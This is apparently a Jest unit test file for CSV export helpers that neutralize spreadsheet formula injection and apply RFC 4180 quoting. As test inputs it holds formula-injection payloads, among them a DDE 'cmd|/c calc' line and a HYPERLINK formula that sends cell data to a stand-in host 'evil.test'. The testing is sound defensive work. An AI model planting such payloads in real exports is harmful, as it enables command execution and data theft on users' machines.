/**
 * Unit tests for the shared CSV serialization helpers.
 *
 * The security-relevant property: no exported cell may reach a spreadsheet with
 * a leading formula trigger (`=`, `+`, `-`, `@`, TAB, CR) intact, while RFC 4180
 * quoting stays correct and plain numbers stay numeric.
 */

import { escapeCsvField, neutralizeCsvFormula, quoteCsvField } from './csv';

describe('neutralizeCsvFormula', () => {
  it.each([
    ['=cmd|/c calc', "'=cmd|/c calc"],
    ['=HYPERLINK("http://evil.test/?d="&A1,"CLICK")', '\'=HYPERLINK("http://evil.test/?d="&A1,"CLICK")'],
    ['+1-555-0134', "'+1-555-0134"],
    ['- check bore per print', "'- check bore per print"],
    ['@rev A', "'@rev A"],
    ['\t=1+1', "'\t=1+1"],
    ['\r=1+1', "'\r=1+1"],
  ])('neutralizes %j', (input, expected) => {
    expect(neutralizeCsvFormula(input)).toBe(expected);
  });

  it.each(['-5.00', '-0.005', '-5', '+5', '5', '5.5', '0', '.5', '-.5', '+0.0', '1e5', '-1.5e-3', '-1E+3'])(
    'leaves the plain number %j untouched',
    (input) => {
      expect(neutralizeCsvFormula(input)).toBe(input);
    }
  );

  it.each(['Widget A', 'PN-1234', '', 'a=b', '3 - 4', '  -5'])(
    'leaves %j untouched (no leading trigger)',
    (input) => {
      expect(neutralizeCsvFormula(input)).toBe(input);
    }
  );

  it('does not treat whitespace-prefixed numbers as numbers', () => {
    // Number('\t5') === 5, which is exactly why the number check is a regex and
    // not Number(): TAB/CR are triggers precisely because the sheet strips them.
    expect(neutralizeCsvFormula('\t5')).toBe("'\t5");
    expect(neutralizeCsvFormula('\r5')).toBe("'\r5");
  });

  it('neutralizes near-numbers that are not plain numbers', () => {
    expect(neutralizeCsvFormula('-')).toBe("'-");
    expect(neutralizeCsvFormula('-Infinity')).toBe("'-Infinity");
    expect(neutralizeCsvFormula('-5-5')).toBe("'-5-5");
    expect(neutralizeCsvFormula('-0x10')).toBe("'-0x10");
  });
});

describe('quoteCsvField', () => {
  it('leaves plain values unquoted', () => {
    expect(quoteCsvField('Alpha')).toBe('Alpha');
  });

  it('quotes and doubles per RFC 4180', () => {
    expect(quoteCsvField('Bravo, Inc')).toBe('"Bravo, Inc"');
    expect(quoteCsvField('say "hi"')).toBe('"say ""hi"""');
    expect(quoteCsvField('line1\nline2')).toBe('"line1\nline2"');
    expect(quoteCsvField('line1\r\nline2')).toBe('"line1\r\nline2"');
  });
});

describe('escapeCsvField', () => {
  it('neutralizes before quoting so a neutralized value with a comma is still quoted', () => {
    expect(escapeCsvField('=HYPERLINK("http://evil.test/?d="&A1,"CLICK")')).toBe(
      '"\'=HYPERLINK(""http://evil.test/?d=""&A1,""CLICK"")"'
    );
    expect(escapeCsvField('=A1,B2')).toBe('"\'=A1,B2"');
  });

  it('quotes a dangerous value that also spans lines', () => {
    expect(escapeCsvField('@rev A\nrev B')).toBe('"\'@rev A\nrev B"');
  });

  it('keeps numbers usable as numbers', () => {
    expect(escapeCsvField(-5.0)).toBe('-5');
    expect(escapeCsvField('-5.00')).toBe('-5.00');
    expect(escapeCsvField('-0.005')).toBe('-0.005');
    expect(escapeCsvField(1234)).toBe('1234');
    expect(escapeCsvField(0)).toBe('0');
  });

  it('is safe for empty / null / undefined', () => {
    expect(escapeCsvField('')).toBe('');
    expect(escapeCsvField(null)).toBe('');
    expect(escapeCsvField(undefined)).toBe('');
  });

  it('passes ordinary tenant text through unchanged', () => {
    expect(escapeCsvField('Bracket, LH')).toBe('"Bracket, LH"');
    expect(escapeCsvField('PN-1234 Rev A')).toBe('PN-1234 Rev A');
    expect(escapeCsvField(false)).toBe('false');
  });

  it('handles the realistic shop-floor strings from the rule', () => {
    expect(escapeCsvField('+1-555-0134')).toBe("'+1-555-0134");
    expect(escapeCsvField('- check bore per print')).toBe("'- check bore per print");
    expect(escapeCsvField('@rev A')).toBe("'@rev A");
  });

  it('never emits a cell whose parsed text starts with a formula trigger', () => {
    const payloads = [
      '=1+1',
      '+1+1',
      '-1+1',
      '@SUM(A1)',
      '\t=1+1',
      '\r=1+1',
      '=cmd|/c calc!A1',
      '=1+1,=2+2',
    ];
    payloads.forEach((p) => {
      const cell = escapeCsvField(p);
      // Strip the RFC 4180 wrapper to inspect the text the sheet will parse.
      const parsed = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
      expect(parsed.startsWith("'")).toBe(true);
      expect(/^[=+\-@\t\r]/.test(parsed)).toBe(false);
    });
  });
});
